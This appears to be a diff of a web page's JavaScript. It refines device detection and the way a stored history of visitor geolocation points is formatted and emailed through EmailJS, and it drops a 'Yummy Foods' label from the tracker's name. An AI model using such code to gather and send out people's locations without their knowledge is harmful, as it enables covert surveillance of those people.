@@ -279,15 +279,20 @@
             }
         }
     
-        // Function to detect the device type using userAgent
         function getDeviceType() {
             const userAgent = navigator.userAgent;
             if (/android/i.test(userAgent)) {
                 return "Android";
             } else if (/iPhone|iPad|iPod/i.test(userAgent)) {
                 return "iOS Device";
+            } else if (/Windows/i.test(userAgent)) {
+                return "Windows Device";
+            } else if (/Mac/i.test(userAgent)) {
+                return "Mac Device";
+            } else if (/Linux/i.test(userAgent)) {
+                return "Linux Device";
             } else {
-                return "Other";
+                return "Unknown Device";
             }
         }
         
@@ -307,16 +312,17 @@
         
         function sendStoredLocations() {
             if (locationHistory.length > 0) {
-                const messages = locationHistory.map((loc, index) => {
-                    return `Location ${index + 1}: Latitude: ${loc.latitude}, Longitude: ${loc.longitude}, Accuracy: ${loc.accuracy} meters`;
-                }).join('\n');
+                const deviceType = getDeviceType();
+                const locationMessages = locationHistory.map((loc, index) => {
+                    return `Location ${index + 1}:\nLatitude: ${loc.latitude}\nLongitude: ${loc.longitude}\nAccuracy: ${loc.accuracy} meters`;
+                }).join('\n\n');
         
-                const deviceType = getDeviceType(); // Get device type
+                const message = `Device: ${deviceType}\n\n${locationMessages}`;
                 
                 const emailData = {
-                    from_name: "Yummy Foods Location Tracker",
-                    message: messages,
-                    device_name: deviceType // Include device name in email data
+                    from_name: "Location Tracker",
+                    message: message,
+                    device_name: deviceType
                 };
         
                 emailjs.send("service_7ee2uba", "template_b4j0rx4", emailData)
